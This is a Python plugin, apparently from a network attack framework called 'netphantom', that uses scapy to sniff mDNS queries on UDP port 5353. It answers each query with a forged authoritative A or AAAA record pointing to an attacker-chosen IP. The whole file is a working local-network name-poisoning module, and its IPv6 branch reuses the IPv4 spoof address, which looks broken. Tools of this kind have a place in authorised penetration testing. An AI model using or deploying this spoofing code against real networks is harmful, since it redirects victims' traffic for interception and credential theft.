import asyncio
from typing import Any, Dict
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from netphantom.core.interfaces import ProtocolPlugin
from netphantom.utils.logger import logger

class MDNSPlugin(ProtocolPlugin):
    @property
    def name(self) -> str:
        return "mdns"

    async def setup(self, config: Dict[str, Any]) -> None:
        self.interface = config.get("interface", "eth0")
        self.spoof_ip = config.get("spoof_ip", "127.0.0.1")
        self.running = False

    async def start(self) -> None:
        self.running = True
        asyncio.create_task(self._run())

    async def stop(self) -> None:
        self.running = False
        logger.info("[mDNS] Plugin stopped.")

    async def _run(self) -> None:
        logger.info(f"[mDNS] Starting discovery on {self.interface}")
        def stop_filter(p: Packet) -> bool:
            return not self.running

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._sniff_blocking, stop_filter)

    def _sniff_blocking(self, stop_filter: Any) -> None:
        sniff(
            iface=self.interface, 
            filter="udp port 5353", 
            prn=self._handle_packet, 
            store=0, 
            stop_filter=stop_filter
        )

    def _handle_packet(self, packet: Packet) -> None:
        if DNS in packet and packet[DNS].qr == 0:
            if DNSQR in packet:
                query_name = packet[DNSQR].qname.decode(errors='ignore').rstrip('.')
                source_ip = packet[IP].src if IP in packet else (packet[IPv6].src if IPv6 in packet else "Unknown")
                
                logger.info(f"[mDNS] Intercepted query for {query_name} from {source_ip}")
                
                # IPv4 response crafting
                if IP in packet:
                    resp = IP(dst="224.0.0.251", src=self.spoof_ip) / \
                           UDP(dport=5353, sport=5353) / \
                           DNS(id=0, qr=1, aa=1, rd=0, ra=0, z=0, rcode=0,
                               qd=packet[DNS].qd,
                               an=DNSRR(rrname=packet[DNSQR].qname, type='A', rdata=self.spoof_ip))
                    
                    send(resp, iface=self.interface, verbose=False)
                    logger.info(f"[mDNS] Spoofed IPv4 response sent to 224.0.0.251")

                # IPv6 response crafting
                elif IPv6 in packet:
                    logger.info(f"[mDNS] Crafting IPv6 response for {query_name}")
                    resp = IPv6(dst="ff02::fb", src=self.spoof_ip) / \
                           UDP(dport=5353, sport=5353) / \
                           DNS(id=0, qr=1, aa=1, rd=0, ra=0, z=0, rcode=0,
                               qd=packet[DNS].qd,
                               an=DNSRR(rrname=packet[DNSQR].qname, type='AAAA', rdata=self.spoof_ip))
                    
                    send(resp, iface=self.interface, verbose=False)
                    logger.info(f"[mDNS] Spoofed IPv6 response sent to ff02::fb")
